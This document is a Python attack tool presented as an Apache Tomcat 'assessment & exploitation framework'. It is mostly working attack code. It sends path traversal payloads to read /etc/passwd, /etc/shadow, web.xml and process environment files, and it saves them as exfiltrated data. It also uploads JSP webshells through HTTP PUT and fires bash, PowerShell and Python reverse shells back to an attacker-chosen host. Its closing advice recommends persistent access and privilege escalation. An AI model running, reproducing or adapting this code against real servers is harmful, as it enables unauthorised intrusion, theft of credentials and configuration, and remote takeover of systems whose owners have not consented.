#!/usr/bin/env python3
"""
Apache Tomcat Super Scanner - Combined CVE Assessment
CVE-2020-17530 + CVE-2025-55752 + RCE Capabilities
Comprehensive Tomcat Vulnerability Assessment Tool
"""

import requests
import sys
import time
import random
import re
import json
from urllib.parse import urljoin, quote
import threading

class TomcatSuperScanner:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'close'
        })
        requests.packages.urllib3.disable_warnings()
        self.results = {
            'cve_2020_17530': False,
            'cve_2025_55752': False,
            'put_enabled': False,
            'version': None,
            'vulnerable_paths': []
        }
        
    def banner(self):
        print("""
░██████████  ░██████   ░███     ░███   ░██████     ░███    ░██████████
    ░██     ░██   ░██  ░████   ░████  ░██   ░██   ░██░██       ░██    
    ░██    ░██     ░██ ░██░██ ░██░██ ░██         ░██  ░██      ░██    
    ░██    ░██     ░██ ░██ ░████ ░██ ░██        ░█████████     ░██    
    ░██    ░██     ░██ ░██  ░██  ░██ ░██        ░██    ░██     ░██    
    ░██     ░██   ░██  ░██       ░██  ░██   ░██ ░██    ░██     ░██    
    ░██      ░██████   ░██       ░██   ░██████  ░██    ░██     ░██    
                                                                      
           Apache Tomcat CVE Assessment & Exploitation Framework
               CVE-2020-17530 + CVE-2025-55752 + RCE
                     by ek0ms savi0r ≽^•⩊•^≼
        """)
    
    def get_input(self):
        print("[+] Target Configuration")
        self.target = input("Enter target URL (e.g., http://192.168.1.100:8080): ").strip()
        if not self.target.startswith(('http://', 'https://')):
            self.target = 'http://' + self.target
        
        if not self.verify_target(self.target):
            retry = input("[-] Target verification failed. Continue anyway? (y/n): ").lower()
            if retry != 'y':
                sys.exit(1)
        
        print("\n[+] Scan Mode Selection")
        print("1. Vulnerability Assessment Only")
        print("2. Assessment + RCE Check") 
        print("3. Full Exploitation (Traversal + RCE + Reverse Shell)")
        print("4. Stealth Mode (Slower, less noisy)")
        
        choice = input("Select option (1-4): ").strip()
        
        if choice == "1":
            self.scan_type = "assessment"
        elif choice == "2":
            self.scan_type = "rce_check"
        elif choice == "3":
            self.scan_type = "exploit"
            self.setup_reverse_shell()
        elif choice == "4":
            self.scan_type = "stealth"
        else:
            print("[-] Invalid selection, using assessment mode")
            self.scan_type = "assessment"
        
        print(f"\n[+] Starting {self.scan_type} scan against {self.target}")
    
    def setup_reverse_shell(self):
        print("\n[+] Reverse Shell Configuration")
        self.lhost = input("Enter your LHOST (listener IP): ").strip()
        self.lport = input("Enter your LPORT (listener port): ").strip()
        
        print("\n[+] Shell Type")
        print("1. Unix/Linux (bash)")
        print("2. Windows (powershell)") 
        print("3. Python universal")
        
        shell_choice = input("Select shell type (1-3): ").strip()
        self.shell_type = ["bash", "powershell", "python"][int(shell_choice)-1] if shell_choice in "123" else "bash"

    def verify_target(self, target):
        print(f"[+] Verifying target: {target}")
        try:
            response = self.session.get(target, timeout=10, verify=False)
            print(f"[+] Target responded with HTTP {response.status_code}")
            
            # Enhanced Tomcat detection
            server_header = response.headers.get('Server', '')
            if 'Apache Tomcat' in server_header or 'Tomcat' in server_header:
                print(f"[+] Tomcat detected: {server_header}")
                return True
            
            tomcat_indicators = ['Apache Tomcat', 'JSP', 'Servlet', 'manager/html', 'org.apache.catalina']
            if any(indicator in response.text for indicator in tomcat_indicators):
                print("[+] Tomcat content indicators found")
                return True
                
            print("[-] No clear Tomcat indicators - may not be Tomcat or could be hidden")
            return True
            
        except Exception as e:
            print(f"[-] Verification failed: {str(e)}")
            return False

    def detect_tomcat_version(self):
        print("\n[+] Detecting Tomcat version...")
        version_patterns = [
            (r'Tomcat[/\s]*([0-9]+\.[0-9]+\.[0-9]+)', "Version in text"),
            (r'Apache Tomcat/([0-9]+\.[0-9]+\.[0-9]+)', "Server header pattern"),
            (r'Server Version:\s*([^<]+)', "Server version field")
        ]
        
        test_paths = ['/', '/docs/', '/manager/status', '/host-manager/']
        
        for path in test_paths:
            try:
                url = urljoin(self.target, path)
                response = self.session.get(url, timeout=5, verify=False)
                
                for pattern, description in version_patterns:
                    match = re.search(pattern, response.text, re.IGNORECASE)
                    if match:
                        version = match.group(1)
                        print(f"[+] Tomcat version detected: {version} ({description})")
                        self.results['version'] = version
                        return version
            except:
                continue
        
        print("[-] Could not determine Tomcat version")
        return None

    def scan_cve_2020_17530(self):
        print("\n[+] Scanning for CVE-2020-17530...")
        
        payloads = [
            ("..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd", "Double URL encoding"),
            ("..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fwindows%252Fwin.ini", "Windows traversal"),
            ("..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252FWEB-INF%252Fweb.xml", "WEB-INF access"),
        ]
        
        for payload, description in payloads:
            if self.test_traversal_payload(payload, description, "CVE-2020-17530"):
                self.results['cve_2020_17530'] = True
                return True
        return False

    def scan_cve_2025_55752(self):
        print("\n[+] Scanning for CVE-2025-55752...")
        
        payloads = [
            ("....//....//....//....//....//etc/passwd", "Double dot slash encoding"),
            ("..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd", "URL encoded slashes"),
            ("..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd", "Double URL encoding"),
            ("..;/..;/..;/..;/..;/etc/passwd", "Semicolon separators"),
            ("....//....//....//....//....//WEB-INF/web.xml", "WEB-INF access"),
        ]
        
        for payload, description in payloads:
            if self.test_traversal_payload(payload, description, "CVE-2025-55752"):
                self.results['cve_2025_55752'] = True
                return True
        return False

    def test_traversal_payload(self, payload, description, cve_name):
        print(f"  Testing {cve_name}: {description}")
        
        try:
            test_url = urljoin(self.target, payload)
            response = self.session.get(test_url, timeout=10, verify=False)
            
            if response.status_code == 200:
                content = response.text
                # File content detection
                file_indicators = [
                    ('root:x:', '/etc/passwd'),
                    ('[extensions]', 'win.ini'),
                    ('<web-app', 'web.xml'),
                    ('<?xml', 'XML file'),
                    ('password', 'Config file')
                ]
                
                for indicator, file_type in file_indicators:
                    if indicator in content:
                        print(f"    [+] VULNERABLE! {cve_name} - Found {file_type}")
                        print(f"    [+] Payload: {payload}")
                        
                        # Save successful payload
                        self.results['vulnerable_paths'].append({
                            'cve': cve_name,
                            'payload': payload,
                            'file_type': file_type,
                            'url': test_url
                        })
                        
                        # Show preview
                        lines = content.split('\n')[:4]
                        print("    [+] File preview:")
                        for line in lines:
                            if line.strip():
                                print(f"      {line[:80]}")
                        return True
                        
            if self.scan_type == "stealth":
                time.sleep(0.5)  # Be less noisy
                
        except Exception as e:
            if self.scan_type != "stealth":
                print(f"    [!] Error: {str(e)}")
        return False

    def check_put_method(self):
        print("\n[+] Checking PUT method availability...")
        
        test_file = f"test_{random.randint(10000,99999)}.txt"
        test_url = urljoin(self.target, test_file)
        
        try:
            # Try OPTIONS first
            response = self.session.request('OPTIONS', self.target, timeout=10, verify=False)
            allowed_methods = response.headers.get('Allow', '')
            if 'PUT' in allowed_methods:
                print("[+] PUT method enabled (via OPTIONS)")
                self.results['put_enabled'] = True
                return True
            
            # Direct PUT test
            response = self.session.put(test_url, data="test", timeout=10, verify=False)
            if response.status_code in [201, 204]:
                print("[+] PUT method enabled (direct test)")
                self.results['put_enabled'] = True
                # Cleanup
                try:
                    self.session.delete(test_url, timeout=5, verify=False)
                except:
                    pass
                return True
                    
        except Exception as e:
            print(f"[-] Error checking PUT: {str(e)}")
        
        print("[-] PUT method not available")
        return False

    def generate_jsp_shell(self, command):
        return f"""<%@ page import="java.util.*,java.io.*" %>
<%
String cmd = "{command}";
String output = "";
if(cmd != null && !cmd.isEmpty()) {{
    Process p = Runtime.getRuntime().exec(new String[]{{"/bin/bash","-c", cmd}});
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while ((line = br.readLine()) != null) {{
        output += line + "\\\\n";
    }}
    br.close();
}}
%>
<pre><%= output %></pre>"""

    def generate_reverse_shell_jsp(self):
        if self.shell_type == "bash":
            cmd = f"bash -c 'bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1'"
        elif self.shell_type == "powershell":
            cmd = f"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{self.lhost}',{self.lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\""
        else:  # python
            cmd = f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{self.lhost}\",{self.lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'"
        
        return self.generate_jsp_shell(cmd)

    def upload_webshell(self):
        print("\n[+] Attempting webshell upload...")
        
        shell_name = f"cmd_{random.randint(10000,99999)}.jsp"
        shell_url = urljoin(self.target, shell_name)
        webshell = self.generate_jsp_shell("id")
        
        try:
            response = self.session.put(shell_url, data=webshell, timeout=10, verify=False)
            if response.status_code in [201, 204]:
                print(f"[+] Webshell uploaded: {shell_url}")
                return shell_url
        except Exception as e:
            print(f"[-] Upload failed: {str(e)}")
        return None

    def upload_reverse_shell(self):
        print("\n[+] Uploading reverse shell...")
        
        shell_name = f"rev_{random.randint(10000,99999)}.jsp"
        shell_url = urljoin(self.target, shell_name)
        reverse_shell = self.generate_reverse_shell_jsp()
        
        try:
            response = self.session.put(shell_url, data=reverse_shell, timeout=10, verify=False)
            if response.status_code in [201, 204]:
                print(f"[+] Reverse shell uploaded: {shell_url}")
                print(f"[!] Start listener: nc -nvlp {self.lport}")
                input("[!] Press Enter to trigger reverse shell...")
                
                # Trigger
                self.session.get(shell_url, timeout=2, verify=False)
                print("[+] Reverse shell triggered! Check your listener.")
                return True
        except:
            print("[-] Reverse shell failed")
        return False

    def exploit_sensitive_files(self):
        print("\n[+] Exploiting - Reading sensitive files...")
        
        files_to_read = [
            ("....//....//....//....//....//etc/passwd", "/etc/passwd"),
            ("..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd", "/etc/passwd (2020)"),
            ("....//....//....//....//....//etc/shadow", "/etc/shadow"),
            ("....//....//....//....//....//WEB-INF/web.xml", "web.xml"),
            ("..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252FWEB-INF%252Fweb.xml", "web.xml (2020)"),
            ("....//....//....//....//....//proc/self/environ", "Process environ"),
        ]
        
        for payload, filename in files_to_read:
            try:
                test_url = urljoin(self.target, payload)
                response = self.session.get(test_url, timeout=10, verify=False)
                
                if response.status_code == 200 and len(response.text) > 10:
                    print(f"\n[+] EXFILTRATED: {filename}")
                    print("-" * 50)
                    print(response.text[:300])
                    print("-" * 50)
                    
                    # Save file
                    safe_name = filename.replace('/', '_')
                    with open(f"tomcat_{safe_name}.txt", "w") as f:
                        f.write(response.text)
                    print(f"[+] Saved to: tomcat_{safe_name}.txt")
                    
            except Exception as e:
                print(f"[-] Error reading {filename}: {str(e)}")

    def run_scan(self):
        self.banner()
        self.get_input()
        
        print(f"\n[*] Starting comprehensive Tomcat assessment...")
        print(f"[*] Target: {self.target}")
        print(f"[*] Time: {time.strftime('%Y-%m-%d %H:%M:%S')}")
        
        # Phase 1: Reconnaissance
        version = self.detect_tomcat_version()
        
        # Phase 2: Vulnerability Assessment
        cve_2020 = self.scan_cve_2020_17530()
        cve_2025 = self.scan_cve_2025_55752()
        
        # Phase 3: RCE Assessment
        put_enabled = False
        if self.scan_type in ["rce_check", "exploit"]:
            put_enabled = self.check_put_method()
            
            if put_enabled:
                webshell_url = self.upload_webshell()
                if webshell_url and self.scan_type == "exploit":
                    self.upload_reverse_shell()
        
        # Phase 4: Exploitation
        if (cve_2020 or cve_2025) and self.scan_type == "exploit":
            self.exploit_sensitive_files()
        
        # Final Report
        self.generate_report()

    def generate_report(self):
        print("\n" + "="*70)
        print("[SCAN SUMMARY]")
        print("="*70)
        
        print(f"Target: {self.target}")
        print(f"Tomcat Version: {self.results['version'] or 'Unknown'}")
        print(f"Scan Type: {self.scan_type}")
        print(f"Time: {time.strftime('%Y-%m-%d %H:%M:%S')}")
        
        print("\n[VULNERABILITIES]")
        print(f"CVE-2020-17530: {'VULNERABLE' if self.results['cve_2020_17530'] else 'Not Vulnerable'}")
        print(f"CVE-2025-55752: {'VULNERABLE' if self.results['cve_2025_55752'] else 'Not Vulnerable'}")
        print(f"PUT Method: {'ENABLED' if self.results['put_enabled'] else 'Disabled'}")
        
        if self.results['vulnerable_paths']:
            print("\n[EXPLOITATION PATHS]")
            for vuln in self.results['vulnerable_paths']:
                print(f"  {vuln['cve']}: {vuln['file_type']}")
                print(f"    URL: {vuln['url']}")
        
        print("\n[NEXT STEPS]")
        if self.results['cve_2020_17530'] or self.results['cve_2025_55752']:
            print("  - Read sensitive files using the vulnerable paths above")
            print("  - Attempt to retrieve configuration files, source code")
        
        if self.results['put_enabled']:
            print("  - Deploy webshells for persistent access")
            print("  - Attempt privilege escalation on the host")
        
        print("\n[+] Assessment completed!")

def main():
    try:
        scanner = TomcatSuperScanner()
        scanner.run_scan()
    except KeyboardInterrupt:
        print("\n[-] Scan interrupted by user")
    except Exception as e:
        print(f"\n[!] Error: {str(e)}")

if __name__ == "__main__":
    main()
